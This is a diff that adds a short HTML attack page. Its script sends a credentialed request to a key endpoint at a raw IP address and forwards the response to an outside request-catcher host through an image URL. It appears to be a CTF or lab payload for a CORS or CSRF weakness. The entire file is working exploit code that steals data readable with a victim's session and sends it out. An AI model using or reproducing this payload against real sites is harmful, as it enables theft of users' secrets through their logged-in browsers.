@@ -1,0 +1,19 @@
+<!DOCTYPE html>
+<html>
+<body>
+<script>
+var xhr = new XMLHttpRequest();
+xhr.onreadystatechange = function() {
+    if(this.readyState == 4) {
+        var data = this.responseText;
+        // ส่งไปที่ requestcatcher
+        var img = new Image();
+        img.src = "https://asscor.requestcatcher.com/log?key=" + encodeURIComponent(data);
+    }
+};
+xhr.open("GET", "http://136.85.123.253/key.php", true);
+xhr.withCredentials = true;
+xhr.send();
+</script>
+</body>
+</html>
